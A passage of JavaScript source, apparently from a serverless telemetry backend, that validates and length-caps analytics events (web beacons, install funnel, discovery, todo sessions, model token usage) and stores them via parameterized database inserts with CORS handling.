    ["end_to_end_ownership_min", body.end_to_end_ownership_min ?? null],
    ["end_to_end_ownership_mean", body.end_to_end_ownership_mean ?? null],
    ["end_to_end_ownership_count", body.end_to_end_ownership_count || 0],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "todo_session_details", values);
  }
}

async function insertWebDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["path", body.path || null],
    ["referrer", body.referrer || null],
    ["visitor_id", body.visitor_id || null],
    ["utm_source", body.utm_source || null],
    ["utm_medium", body.utm_medium || null],
    ["utm_campaign", body.utm_campaign || null],
    ["cta", body.cta || null],
    ["metric_name", body.metric_name || null],
    ["metric_value", body.metric_value ?? null],
    ["rating", body.rating || null],
    ["error_kind", body.error_kind || null],
    ["pageview_id", body.pageview_id || null],
    ["conversion_id", body.conversion_id || null],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "web_details", values);
  }
}

async function insertInstallDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["conversion_id", body.conversion_id],
    ["stage", body.stage],
    ["outcome", body.outcome],
    ["source", body.source],
    ["placement", body.placement || null],
    ["install_method", body.install_method || null],
    ["failure_stage", body.failure_stage || null],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, "install_details", values);
  }
}

// Normalize a website beacon event in place. Browsers do not send
// version/os/arch and mint an anonymous visitor_id in localStorage, so the
// visitor_id doubles as the telemetry id and free-text fields are
// length-capped (same defensive posture as the firehose blob caps).
// Returns an error string when the event is invalid, otherwise null.
function normalizeWebEvent(body) {
  if (typeof body.visitor_id !== "string" || body.visitor_id.length === 0) {
    return "Missing visitor_id";
  }
  if (typeof body.path !== "string" || body.path.length === 0) {
    return "Missing path";
  }
  if (body.event === "web_cta_click" && (typeof body.cta !== "string" || body.cta.length === 0)) {
    return "Missing cta";
  }
  if (body.event === "web_vital") {
    const metricNames = new Set(["CLS", "FCP", "INP", "LCP", "TTFB"]);
    const ratings = new Set(["good", "needs-improvement", "poor"]);
    if (!metricNames.has(body.metric_name)) {
      return "Invalid metric_name";
    }
    if (typeof body.metric_value !== "number" || !Number.isFinite(body.metric_value) || body.metric_value < 0) {
      return "Invalid metric_value";
    }
    if (!ratings.has(body.rating)) {
      return "Invalid rating";
    }
    const cap = body.metric_name === "CLS" ? 10 : 300_000;
    body.metric_value = Math.min(body.metric_value, cap);
  }
  if (body.event === "web_error") {
    const errorKinds = new Set(["script", "promise", "resource"]);
    if (!errorKinds.has(body.error_kind)) {
      return "Invalid error_kind";
    }
    // Keep only route-level context for errors. In particular, do not retain
    // referrer or campaign values that may contain full URLs or query strings.
    for (const field of [
      "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
      "session_id", "pageview_id", "conversion_id", "placement", "install_method",
    ]) {
      delete body[field];
    }
  }
  if (body.conversion_id != null && !CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (body.install_method != null && !new Set([
    "shell", "download_macos", "download_linux", "download_windows",
  ]).has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !new Set(["hero", "sticky"]).has(body.placement)) {
    return "Invalid install placement";
  }
  // Error payloads are classification-only. Never retain messages, stacks,
  // filenames, or full URLs even if a caller includes them.
  for (const field of ["message", "error_message", "stack", "url", "filename", "source_url"]) {
    delete body[field];
  }
  body.visitor_id = body.visitor_id.slice(0, 96);
  if (body.session_id != null) body.session_id = String(body.session_id).slice(0, 96);
  body.id = body.id || body.visitor_id;
  // The beacon does not send an event_id, but web_details rows join on it.
  // Mint one server-side so path/referrer/utm/cta are actually persisted.
  body.event_id = body.event_id || crypto.randomUUID();
  body.version = body.version || "web";
  body.os = body.os || "web";
  body.arch = body.arch || "web";
  for (const field of [
    "path", "referrer", "utm_source", "utm_medium", "utm_campaign", "cta",
    "pageview_id", "conversion_id", "placement", "install_method",
  ]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

const CONVERSION_ID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

function normalizeInstallConversion(body) {
  if (!CONVERSION_ID_PATTERN.test(body.install_conversion_id)) {
    return "Invalid install_conversion_id";
  }
  body.conversion_id = body.install_conversion_id.toLowerCase();
  return null;
}

function normalizeInstallFunnelEvent(body) {
  const stages = new Set(["command_copy", "script_request", "installer_start", "installer_finish"]);
  const outcomes = new Set(["success", "failure"]);
  const sources = new Set(["browser", "install_endpoint", "installer"]);
  const methods = new Set(["shell", "download_macos", "download_linux", "download_windows"]);
  const placements = new Set(["hero", "sticky"]);

  if (!CONVERSION_ID_PATTERN.test(body.conversion_id)) {
    return "Invalid conversion_id";
  }
  if (!stages.has(body.stage)) {
    return "Invalid install stage";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid install outcome";
  }
  if (!sources.has(body.source)) {
    return "Invalid install source";
  }
  if (body.install_method != null && !methods.has(body.install_method)) {
    return "Invalid install_method";
  }
  if (body.placement != null && !placements.has(body.placement)) {
    return "Invalid install placement";
  }
  if (body.failure_stage != null && !/^[a-z0-9_]{0,64}$/i.test(body.failure_stage)) {
    return "Invalid failure_stage";
  }
  if (body.outcome !== "failure") {
    body.failure_stage = null;
  }
  body.conversion_id = body.conversion_id.toLowerCase();
  body.id = body.id || body.conversion_id;
  body.event_id = body.event_id || crypto.randomUUID();
  for (const field of ["stage", "outcome", "source", "placement", "install_method", "failure_stage"]) {
    if (body[field] != null) body[field] = String(body[field]).slice(0, 100);
  }
  return null;
}

// Normalize a token-subscription event in place. account_id is required for
// all of them; account_linked is the analytics<->account join event and also
// requires the telemetry id. Returns an error string or null.
function normalizeSubscriptionEvent(body) {
  if (typeof body.account_id !== "string" || body.account_id.length === 0) {
    return "Missing account_id";
  }
  body.account_id = body.account_id.slice(0, 96);
  for (const field of ["tier", "model"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 200);
    }
  }
  return null;
}

function normalizeDiscoveryEvent(body) {
  const phases = new Set(["browse", "details", "select", "suggest", "unknown"]);
  const outcomes = new Set(["success", "failure"]);
  const failures = new Set([
    "disabled", "invalid_input", "invalid_category", "timeout",
    "connect_error", "transport_error", "http_error", "body_error",
    "response_too_large", "invalid_json", "invalid_response",
  ]);
  if (typeof body.request_id !== "string" || body.request_id.length === 0) {
    return "Missing request_id";
  }
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(body.request_id)) {
    return "Invalid request_id";
  }
  if (!phases.has(body.phase)) {
    return "Invalid discovery phase";
  }
  if (!outcomes.has(body.outcome)) {
    return "Invalid discovery outcome";
  }
  if (body.outcome === "failure" && !failures.has(body.failure_reason)) {
    return "Invalid discovery failure_reason";
  }
  if (body.outcome === "success") {
    body.failure_reason = null;
  }
  body.request_id = body.request_id.slice(0, 96);
  for (const field of ["category", "selected_tool"]) {
    if (body[field] != null) {
      body[field] = String(body[field]).slice(0, 100);
      if (!/^[a-z0-9][a-z0-9 ._+\/-]{0,99}$/i.test(body[field])) {
        return `Invalid discovery ${field}`;
      }
    }
  }
  body.http_status = body.http_status == null ? null : Math.max(100, Math.min(599, Number(body.http_status) || 0));
  body.latency_ms = Math.max(0, Math.min(300_000, Number(body.latency_ms) || 0));
  body.response_bytes = body.response_bytes == null ? null : Math.max(0, Math.min(1_048_576, Number(body.response_bytes) || 0));
  body.result_count = body.result_count == null ? null : Math.max(0, Math.min(10_000, Number(body.result_count) || 0));
  body.benchmark_run = body.benchmark_run === true;
  return null;
}

function normalizeTodoSessionEvent(body) {
  const uuidV4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  const endReasons = new Set([
    "normal_exit", "panic", "signal", "disconnect", "reload", "superseded", "unknown",
  ]);
  if (typeof body.correlation_id !== "string" || !uuidV4.test(body.correlation_id)) {
    return "Invalid todo correlation_id";
  }
  // This event must never carry the persistent telemetry ID. Its required `id`
  // envelope field is the same ephemeral UUID used for the within-session join.
  if (body.id !== body.correlation_id) {
    return "Todo id must equal correlation_id";
  }
  if (!endReasons.has(body.session_end_reason)) {
    return "Invalid todo session_end_reason";
  }

  for (const field of [
    "todos_created", "todos_completed", "todos_abandoned", "todo_updates",
    "groups_completed", "groups_total", "max_todo_list_size", "confidence_count",
    "completion_confidence_count", "understands_user_intent_count",
    "closed_feedback_loop_count", "end_to_end_ownership_count",
  ]) {
    body[field] = Math.max(0, Math.min(1_000_000, Math.trunc(Number(body[field]) || 0)));
  }
  for (const field of [
    "confidence_min", "confidence_mean", "completion_confidence_min",
    "completion_confidence_mean", "understands_user_intent_min",
    "understands_user_intent_mean", "closed_feedback_loop_min",
    "closed_feedback_loop_mean", "end_to_end_ownership_min", "end_to_end_ownership_mean",
  ]) {
    body[field] = body[field] == null
      ? null
      : Math.max(0, Math.min(100, Number(body[field]) || 0));
  }
  return null;
}

async function insertDynamic(env, table, entries) {
  const columns = entries.map(([name]) => name);
  const placeholders = columns.map(() => "?").join(", ");
  const sql = `INSERT OR IGNORE INTO ${table} (${columns.join(", ")}) VALUES (${placeholders})`;
  const values = entries.map(([, value]) => value);
  const result = await env.DB.prepare(sql).bind(...values).run();
  observeDbSize(result);
  return result;
}

function boolToInt(value) {
  return value ? 1 : 0;
}

const USAGE_REPORT_SOURCES = new Set(["agent", "compaction", "sidecar"]);
const USAGE_TOKEN_FIELDS = [
  "input_tokens",
  "output_tokens",
  "cache_read_input_tokens",
  "cache_creation_input_tokens",
  "total_tokens",
];
// One provider response cannot plausibly exceed this; rejects garbage that
// would otherwise poison the spend rollup.
const MAX_USAGE_TOKENS_PER_REPORT = 50_000_000;

function normalizeUsageLabel(value) {
  if (typeof value !== "string") {
    return "";
  }
  return value.trim().slice(0, 120);
}

// Validates a `usage_report` and maps it onto the shared firehose blobs:
// provider/model go to provider_end/model_end (the model that served the
// response) and source goes to `step`, so per-response detail stays queryable
// in Analytics Engine without widening the full FIREHOSE_SCHEMA.
export function normalizeUsageReportEvent(body) {
  if (!USAGE_REPORT_SOURCES.has(body.source)) {
    return "Invalid usage_report source";
  }
  body.provider = normalizeUsageLabel(body.provider);
  body.model = normalizeUsageLabel(body.model);
  if (!body.model) {
    return "Missing usage_report model";
  }
  for (const field of USAGE_TOKEN_FIELDS) {
    const value = body[field] ?? 0;
    if (!Number.isInteger(value) || value < 0 || value > MAX_USAGE_TOKENS_PER_REPORT) {
      return `Invalid usage_report ${field}`;
    }
    body[field] = value;
  }
  const responses = body.responses ?? 1;
  if (!Number.isInteger(responses) || responses < 1 || responses > 10_000) {
    return "Invalid usage_report responses";
  }
  body.responses = responses;
  body.provider_end = body.provider;
  body.model_end = body.model;
  body.step = body.source;
  return null;
}

async function recordDailyModelUsage(env, body) {
  const usageDate = new Date().toISOString().slice(0, 10);
  await env.DB.prepare(`
    INSERT INTO daily_model_usage (
      usage_date, source, provider, model, build_channel, is_ci, responses,
      input_tokens, output_tokens, cache_read_input_tokens,
      cache_creation_input_tokens, total_tokens
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(usage_date, source, provider, model, build_channel, is_ci) DO UPDATE SET
      responses = responses + excluded.responses,
      input_tokens = input_tokens + excluded.input_tokens,
      output_tokens = output_tokens + excluded.output_tokens,
      cache_read_input_tokens = cache_read_input_tokens + excluded.cache_read_input_tokens,
      cache_creation_input_tokens = cache_creation_input_tokens + excluded.cache_creation_input_tokens,
      total_tokens = total_tokens + excluded.total_tokens,
      updated_at = datetime('now')
  `).bind(
    usageDate,
    body.source,
    body.provider || "",
    body.model,
    body.build_channel || "",
    boolToInt(body.is_ci),
    body.responses,
    body.input_tokens,
    body.output_tokens,
    body.cache_read_input_tokens,
    body.cache_creation_input_tokens,
    body.total_tokens,
  ).run();
}

function jsonResponse(data, status = 200, cors = null) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      ...(cors || corsHeaders()),
    },
  });
}

function corsHeaders(request = null, env = null) {
  // Default policy: ALLOWED_ORIGIN var (currently "*"; telemetry is anonymous
  // and unauthenticated). Website beacon origins are additionally echoed back
  // explicitly, so browser preflights keep passing even if ALLOWED_ORIGIN is
  // ever narrowed away from "*".
  let allowOrigin = env?.ALLOWED_ORIGIN || "*";
  const origin = request?.headers?.get?.("Origin");
  const headers = {
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
  if (origin && WEB_ALLOWED_ORIGINS.has(origin)) {
    allowOrigin = origin;
    headers["Vary"] = "Origin";
  }
  headers["Access-Control-Allow-Origin"] = allowOrigin;
  return headers;
}
